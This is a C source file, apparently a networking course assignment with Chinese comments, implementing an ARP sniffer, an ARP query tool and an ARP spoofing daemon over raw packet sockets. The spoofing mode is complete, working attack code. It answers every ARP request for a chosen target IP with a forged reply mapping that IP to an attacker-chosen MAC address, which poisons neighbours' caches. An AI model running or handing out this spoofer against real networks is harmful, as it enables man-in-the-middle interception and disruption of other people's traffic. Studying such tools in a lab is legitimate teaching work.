#include <netinet/if_ether.h> 
#include <sys/types.h>
#include <sys/socket.h>   
#include <sys/ioctl.h>  
#include <netpacket/packet.h> 
#include <net/ethernet.h>
#include <net/if.h>   
#include "arp.h"  

#include <arpa/inet.h> 
#include <netinet/in.h>
#include <unistd.h> 
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <errno.h> 
#include <stdbool.h>
#include <sys/select.h>
#include <signal.h> 
#include <time.h>

#define DEVICE_NAME "enp0s3" 
#define RECV_TIMEOUT_SEC 5      // 定義接收封包的超時時間為 5 秒

/*發送 ARP Request 並等待 Reply (Part 2) */
int do_arp_query(const char *ifname, const unsigned char target_ip_bytes[4]) {
    int sock_send = -1, sock_recv = -1;
    struct ifreq ifr;                  //用來查網卡資訊
    int ifindex = -1;                   // 儲存Interface Index
    unsigned char src_mac[6];           // 儲存本機 MAC address
    unsigned char src_ip[4];            // 儲存本機 IP address
    struct sockaddr_ll sall;            // 宣告 Link-Layer Socket 位址結構

    // 建立發送用的原始 Socket，協定為 ETH_P_ALL (接收所有協定)
    sock_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_send < 0) { perror("socket(send)"); goto fail; }

    // 建立接收用的原始 Socket
    sock_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_recv < 0) { perror("socket(recv)"); goto fail; } 

    /* 取得Interface Index*/
    memset(&ifr, 0, sizeof(ifr));               // 清空 ifr 結構
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);  // 將網卡名稱複製到 ifr 結構中
    // 使用 ioctl 取得介面索引
    if (ioctl(sock_send, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl(SIOCGIFINDEX)"); goto fail; }
    ifindex = ifr.ifr_ifindex;                  // 儲存查到的索引

    /* 取得網卡 MAC 位址 (Hardware Address) */
    memset(&ifr, 0, sizeof(ifr)); 
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    // 使用 ioctl 取得硬體位址
    if (ioctl(sock_send, SIOCGIFHWADDR, &ifr) < 0) { perror("ioctl(SIOCGIFHWADDR)"); goto fail; }
    memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6); // 將查到的 MAC 複製到 src_mac

    /* 取得網卡 IP 位址 */
    memset(&ifr, 0, sizeof(ifr)); 
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1); 
    // 使用 ioctl 取得 IP 位址 
    if (ioctl(sock_send, SIOCGIFADDR, &ifr) < 0) { perror("ioctl(SIOCGIFADDR)"); goto fail; }
    struct sockaddr_in *saddr = (struct sockaddr_in *)&ifr.ifr_addr; // 轉型為 sockaddr_in
    memcpy(src_ip, &saddr->sin_addr, 4);        // 將 IP 複製到 src_ip

    /* 準備 sendto 需要的 sockaddr_ll 結構 */
    memset(&sall, 0, sizeof(sall));             // 清空 sall 結構
    sall.sll_family = AF_PACKET;                // 設定位址家族為 AF_PACKET
    sall.sll_ifindex = ifindex;                 // 設定網卡索引
    sall.sll_halen = ETH_ALEN;                  // 設定硬體位址長度
    memset(sall.sll_addr, 0xff, 6);             // 設定目標 MAC 為廣播 (FF:FF:FF:FF:FF:FF)

    /* 建立 ARP Request 封包 */
    struct arp_packet pkt;                   
    memset(&pkt, 0, sizeof(pkt));               // 清空封包內容

    // 設定乙太網路標頭 (Ethernet Header)
    memset(pkt.eth_hdr.ether_dhost, 0xff, ETH_ALEN);    // 目的 MAC：廣播
    memcpy(pkt.eth_hdr.ether_shost, src_mac, ETH_ALEN); // 來源 MAC：本機 MAC
    pkt.eth_hdr.ether_type = htons(ETH_P_ARP);          // 封包類型：ARP

    /* [ arp.c ] 設定 ARP 表頭 */
    set_hard_type(&pkt.arp, ARPHRD_ETHER);  // 設定硬體類型為 Ethernet
    set_prot_type(&pkt.arp, ETH_P_IP);      // 設定協定類型為 IPv4
    set_hard_size(&pkt.arp, ETH_ALEN);      // 設定硬體位址長度
    set_prot_size(&pkt.arp, 4);             // 設定協定位址長度
    set_op_code(&pkt.arp, ARPOP_REQUEST);   // 設定為 Request (1)

    /* [arp.c ] 設定 ARP 位址欄位 */
    set_sender_hardware_addr(&pkt.arp, (char*)src_mac); // 設定發送者 MAC (本機)
    set_sender_protocol_addr(&pkt.arp, (char*)src_ip);  // 設定發送者 IP (本機)
    
    char zero_mac[6] = {0}; // 準備一個全 0 的 MAC
    set_target_hardware_addr(&pkt.arp, zero_mac);       // 設定目標 MAC 為 0(還不知道)
    set_target_protocol_addr(&pkt.arp, (char*)target_ip_bytes); // 設定目標 IP(要查的IP)

    // 發送封包
    if (sendto(sock_send, &pkt, sizeof(pkt), 0, (struct sockaddr*)&sall, sizeof(sall)) < 0) {
        perror("sendto");
        goto fail; 
    }

    /* 使用 select 等待回應 */
    fd_set rfds;                  
    struct timeval tv;       
    time_t start = time(NULL);      // 紀錄開始時間

    while (1) { // 進入接收迴圈
        FD_ZERO(&rfds);             // 清空集合
        FD_SET(sock_recv, &rfds);   // 將接收 Socket 加入集合
        tv.tv_sec = RECV_TIMEOUT_SEC; // 設定超時秒數
        tv.tv_usec = 0;             // 設定超時微秒數
        
        // 等待 Socket 有資料可讀
        int r = select(sock_recv + 1, &rfds, NULL, NULL, &tv);
        if (r < 0) {                // select 發生錯誤
            if (errno == EINTR) continue; // 如果是被訊號中斷，重試
            perror("select"); goto fail;
        } else if (r == 0) {        // select 超時
            fprintf(stderr, "Timeout waiting for ARP reply.\n");
            goto fail;
        }

        unsigned char buf[2048];    // 宣告接收緩衝區
        // 接收封包
        ssize_t n = recvfrom(sock_recv, buf, sizeof(buf), 0, NULL, NULL);
        if (n <= 0) { if (errno == EINTR) continue; perror("recvfrom"); goto fail; }
        
        // 檢查封包長度是否足夠 (Ethernet Header + ARP Packet)
        if ((size_t)n < sizeof(struct ether_header) + sizeof(struct ether_arp)) continue;

        struct ether_header *eth = (struct ether_header *)buf; // 解析ether_header
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;     // 若不是 ARP 封包則略過

        struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header)); // 解析 ARP 內容
        
        // 檢查是否為標準乙太網 ARP
        if (arp->ea_hdr.ar_hln != ETH_ALEN || arp->ea_hdr.ar_pln != 4) continue;
        // 檢查是否為 Reply
        if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REPLY) continue;

        /* 確認這個 Reply 是回給我們的 (Target IP == My IP, Sender IP == Query IP) */
        if (memcmp(arp->arp_spa, target_ip_bytes, 4) == 0 && memcmp(arp->arp_tpa, src_ip, 4) == 0) {
            
            /* [ arp.c ] 將二進位位址轉為字串 */
            char *ip_str = get_sender_protocol_addr(arp); // 取得對方的 IP 字串
            char *mac_str = get_sender_hardware_addr(arp);// 取得對方的 MAC 字串

            if (ip_str && mac_str) { // 確保轉換成功
                printf("ARP reply: %s is at %s\n", ip_str, mac_str); // 印出結果
            }

            /* 釋放配置的記憶體 */
            if (ip_str) free(ip_str);
            if (mac_str) free(mac_str);

            close(sock_send); // 關閉發送 Socket
            close(sock_recv); // 關閉接收 Socket
            return 0;         // 成功結束
        }

        // 檢查總等待時間是否超時
        if (time(NULL) - start > RECV_TIMEOUT_SEC) {
            fprintf(stderr, "Timeout waiting for ARP reply.\n");
            goto fail;
        }
    }

fail: // 錯誤處理
    if (sock_send >= 0) close(sock_send); 
    if (sock_recv >= 0) close(sock_recv); 
    return 1; 
}

// 定義全域變數控制程式結束 (Ctrl+C)
static volatile sig_atomic_t do_exit = 0;
static void sigint_handler(int _) { (void)_; do_exit = 1; } // 訊號處理函式：設定退出旗標

// 比較兩個 IP 是否相同
static bool ip_equal_bytes(const unsigned char a[4], const unsigned char b[4]) {
    return a[0]==b[0] && a[1]==b[1] && a[2]==b[2] && a[3]==b[3];
}
// 將 IP 字串轉為 bytes
static bool parse_ip(const char *s, unsigned char out[4]) {
    struct in_addr a;
    if (inet_pton(AF_INET, s, &a) != 1) return false; 
    memcpy(out, &a, 4); // 複製結果
    return true;
}
// 將 MAC 字串轉為 bytes
static bool parse_mac(const char *s, unsigned char out[6]) {
    int vals[6];
    // 使用 sscanf 解析 xx:xx:xx... 格式
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6)
        return false;
    for (int i=0;i<6;i++) out[i] = (unsigned char)vals[i]; // 轉型並儲存
    return true;
}

/*Part 3: ARP Spoofing*/
static int run_arp_daemon(const char *ifname,
                          const unsigned char fake_mac[6],
                          const unsigned char target_ip_bytes[4])
{
    int sock = -1; 
    struct ifreq ifr; 
    int ifindex; 
    unsigned char buf[2048];        // 接收緩衝區
    struct ether_header *eth;      
    
    printf("[ ARP sniffer and spoof program ]\n");
    printf("### ARP spoof mode ###\n");

    // 建立 Raw Socket
    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); return 1; }

    // 取得介面索引
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl(SIOCGIFINDEX)"); close(sock); return 1; }
    ifindex = ifr.ifr_ifindex;

    // 綁定 Socket 到特定介面
    struct sockaddr_ll sll_bind;
    memset(&sll_bind, 0, sizeof(sll_bind));
    sll_bind.sll_family   = AF_PACKET;
    sll_bind.sll_ifindex  = ifindex;
    sll_bind.sll_protocol = htons(ETH_P_ARP); // 只對 ARP 感興趣
    bind(sock, (struct sockaddr *)&sll_bind, sizeof(sll_bind)); 

    // 捕捉 Ctrl+C
    signal(SIGINT,  sigint_handler);
    signal(SIGTERM, sigint_handler);

    // 主迴圈：持續監聽並回應
    while (!do_exit) {
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL); // 接收封包
        if (n <= 0) { if (errno == EINTR) continue; perror("recvfrom"); break; }

        eth = (struct ether_header *)buf; // 解析 Ethernet Header
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue; // 若非 ARP 則忽略
        if ((size_t)n < sizeof(struct ether_header) + sizeof(struct ether_arp)) continue; // 長度檢查

        struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header)); // 跳過ether_header，解析 ARP

        // 檢查是否為 ARP Request
        int is_request = (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST);
        // 檢查這封包是不是在問”目標IP”
        int tpa_match  = (memcmp(arp->arp_tpa, target_ip_bytes, 4) == 0);

        if (!is_request || !tpa_match) {
            continue; // 如果不是 Request 或目標 IP 不符，忽略
        }

        /* [arp.c ] 取得來源與目的 IP 字串 */
        char *target_ip_str = get_target_protocol_addr(arp); // 誰被查詢？
        char *sender_ip_str = get_sender_protocol_addr(arp); // 誰在查詢？

        if (target_ip_str && sender_ip_str) {
            printf("Get ARP packet - Who has %s ?\tTell %s\n", target_ip_str, sender_ip_str);
        }
        
        /* 記憶體釋放*/
        if (target_ip_str) free(target_ip_str);
        if (sender_ip_str) free(sender_ip_str);
        
        fflush(stdout);

        /* 準備偽造的 ARP Reply */
        unsigned char reply[sizeof(struct ether_header) + sizeof(struct ether_arp)]; // 宣告 Reply 緩衝區
        struct ether_header *reth = (struct ether_header *)reply; // 指向 Reply 的 Ethernet Header
        struct ether_arp    *rarp = (struct ether_arp *)(reply + sizeof(struct ether_header)); // 指向 Reply 的 ARP Header

        /* 設定 回應封包的 Ethernet Header*/
        memcpy(reth->ether_dhost, eth->ether_shost, ETH_ALEN); // 目標 MAC = 請求者的 MAC
        memcpy(reth->ether_shost, fake_mac,        ETH_ALEN); // 來源 MAC = 我們的假 MAC
        reth->ether_type = htons(ETH_P_ARP);                  

        /* [arp.c] 設定 ARP 表頭 */
        set_hard_type(rarp, ARPHRD_ETHER);
        set_prot_type(rarp, ETH_P_IP);
        set_hard_size(rarp, ETH_ALEN);
        set_prot_size(rarp, 4);
        set_op_code(rarp, ARPOP_REPLY); // 設定為 Reply

        /* [arp.c] 設定 ARP 位址*/
        set_sender_hardware_addr(rarp, (char*)fake_mac); 
        set_sender_protocol_addr(rarp, (char*)arp->arp_tpa); // 拿對方問的 Target IP 當作我們的 Source IP
        
        set_target_hardware_addr(rarp, (char*)eth->ether_shost);
        set_target_protocol_addr(rarp, (char*)arp->arp_spa);

        /* 準備發送結構 */
        struct sockaddr_ll sll_send;
        memset(&sll_send, 0, sizeof(sll_send));
        sll_send.sll_family   = AF_PACKET;
        sll_send.sll_ifindex  = ifindex;
        sll_send.sll_halen    = ETH_ALEN;
        memcpy(sll_send.sll_addr, eth->ether_shost, ETH_ALEN); // 設定發送目標為請求者

        // 發送偽造封包
        ssize_t sent = sendto(sock, reply, sizeof(reply), 0,
                              (struct sockaddr *)&sll_send, sizeof(sll_send));
        if (sent == (ssize_t)sizeof(reply)) {
            // 印出發送成功的 Log
            printf("Sent ARP Reply : %u.%u.%u.%u is at %02x:%02x:%02x:%02x:%02x:%02x\n",
                   target_ip_bytes[0], target_ip_bytes[1], target_ip_bytes[2], target_ip_bytes[3],
                   fake_mac[0], fake_mac[1], fake_mac[2],
                   fake_mac[3], fake_mac[4], fake_mac[5]);
            printf("Send successful.\n");
            fflush(stdout);
        } else {
            perror("sendto"); 
        }
    } 

    close(sock);
    return 0;
}

/* 主程式進入點 */
int main(int argc, char **argv) {
    // 檢查是否為 root 權限
    if (geteuid() != 0) {
        fprintf(stderr, "Error: run with sudo\n");
        return 1;
    }

    // 處理 Help 參數：[arp.c] print_usage
    if (argc == 2 && strcmp(argv[1], "-help")==0) { print_usage(); return 0; }

    /* Part 3: Spoof */
    if ((argc==3 || argc==5) && strchr(argv[1],':') && inet_addr(argv[2]) != INADDR_NONE) {
        unsigned char fake_mac[6], target_ip[4];
        if (!parse_mac(argv[1], fake_mac)) { fprintf(stderr,"Invalid MAC format\n"); return 1; } // 解析 MAC
        if (!parse_ip(argv[2], target_ip)) { fprintf(stderr,"Invalid IP format\n"); return 1; }  // 解析 IP
        const char *ifname = DEVICE_NAME;
        // 處理 -i 介面參數
        if (argc==5) {
            if (strcmp(argv[3],"-i")!=0) { print_usage(); return 1; } 
            ifname = argv[4];
        }
        return run_arp_daemon(ifname, fake_mac, target_ip);
    }

    /* Part 2: Query Mode (-q) */
    if ((argc==3 || argc==5) && strcmp(argv[1],"-q")==0) {
        unsigned char targ[4];
        if (!parse_ip(argv[2], targ)) { fprintf(stderr,"Invalid IP\n"); return 1; } // 解析 IP
        const char *ifname = DEVICE_NAME;
        // 處理 -i 介面參數
        if (argc==5) { if (strcmp(argv[3],"-i")!=0) { print_usage(); return 1; } ifname = argv[4]; }
        return do_arp_query(ifname, targ); // 執行 Query
    }

    /* Part 1: Sniffer Mode*/
    bool filter = false;            // 過濾
    unsigned char filter_ip[4];     // 過濾的目標 IP

    if (argc==3 && strcmp(argv[1],"-l")==0 && strcmp(argv[2],"-a")==0) {
        filter = false; // -l -a 監聽全部
    } else if (argc==3 && strcmp(argv[1],"-l")==0) {
        if (!parse_ip(argv[2], filter_ip)) { print_usage(); return 1; } // 解析過濾 IP
        filter = true;  // 開啟過濾
    } else {
        print_usage(); // [arp.c]
        return 1;
    }

    /* Sniffer 主迴圈 */
    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); // 建立 Raw Socket
    if (sock < 0) { perror("socket"); return 1; }
    printf("[ ARP sniffer and spoof program ]\n### ARP sniffer mode ###\n");
    
    unsigned char b[2048]; // 接收緩衝區
    while (!do_exit) { // 持續執行直到 Ctrl+C
        ssize_t n = recvfrom(sock, b, sizeof(b), 0, NULL, NULL); // 接收封包
        if (n<=0) { if (errno==EINTR) continue; perror("recvfrom"); break; }
        // 檢查長度
        if ((size_t)n < sizeof(struct ether_header)+sizeof(struct ether_arp)) continue;
        
        struct ether_header *eth = (struct ether_header*)b;
        if (ntohs(eth->ether_type) != ETH_P_ARP) continue; // 只看 ARP
        
        struct ether_arp *arp = (struct ether_arp*)(b + sizeof(struct ether_header)); // 指向 ARP 表頭
        
        // 過濾:檢查 IP 是否匹配 (來源或目的符合皆可)
        if (filter) {
            if (!(ip_equal_bytes(arp->arp_spa, filter_ip) || ip_equal_bytes(arp->arp_tpa, filter_ip))) continue;
        }

        /* [arp.c] 取得來源與目的 IP 字串 */
        char *sip = get_sender_protocol_addr(arp); // 誰發的?
        char *tip = get_target_protocol_addr(arp); // 問誰?

        if (sip && tip) {
            printf("Get ARP packet - Who has %s ? Tell %s\n", tip, sip);
        }

        /* 記憶體釋放*/
        if (sip) free(sip);
        if (tip) free(tip);

        fflush(stdout); 
    }
    close(sock); 
    return 0;
}

